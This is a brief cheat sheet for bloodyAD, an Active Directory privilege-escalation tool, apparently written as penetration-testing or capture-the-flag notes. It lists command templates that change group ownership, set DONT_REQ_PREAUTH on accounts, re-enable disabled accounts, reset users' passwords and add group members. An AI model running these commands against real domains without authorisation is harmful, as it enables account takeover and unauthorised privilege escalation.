# bloodyAD

## Overview

This tool can perform specific LDAP calls to a domain controller in order to perform AD privesc.

bloodyAD supports authentication using cleartext passwords, pass-the-hash, pass-the-ticket or certificates and binds to LDAP services of a domain controller to perform AD privesc.

Used to perform ldap queries

## Installation

pip install bloodyAD

## Usage

Set owener of group

    bloodyAD --host <host_ip> -d '<domain_name>' -u '<username>' -p '<password>' set owner <group_name> <name_of_new_owner>

Set dont_req_preauth

    bloodyAD --host <dc_controller_name> -d "domain_name" --dc-ip <domain_controller_ip> -k add uac <username_of_target_account> -f DONT_REQ_PREAUTH


Enable an account

    bloodyAD --host <dc_controller_name> -d "domain_name" --dc-ip <domain_controller_ip> -k remov uac <username_of_target_account> -f ACCOUNTDISABLE

Change Set Password

    bloodyAD --host <dc_controller_name> -d "domain_name" --dc-ip <domain_controller_ip> -k set password <username_target> '<new_password>'


### ADD

Add user to group:

```shell
bloodyAD --host $dc -d $domain -u $username -p $password add groupMember $group_name $member_to_add
```

### GET

Get groups a user belong:

```shell
bloodyAD --host [host_ip] -d [domain_name] -u '[user_name]' -p '[user_password]' get membership '[target_user_name]'
```

### SET

Change a users password:

```shell
bloodyAD --host [host_ip] -d [domain_name] -u '[user_name]' -p '[user_password]' set password '[target_user_name]' '[new_password]'
```

### REMOVE

Enable a disabled account:

```shell
bloodyAD --host [host_ip] -d [domain_name] -u '[user_name]' -p '[user_password]' remove uac '[target_user_name]' -f ACCOUNTDISABLE
```

## More Information

https://github.com/CravateRouge/bloodyAD/wiki/User-Guide
https://seriotonctf.github.io/2024/12/01/BloodyAD-Cheatsheet/index.html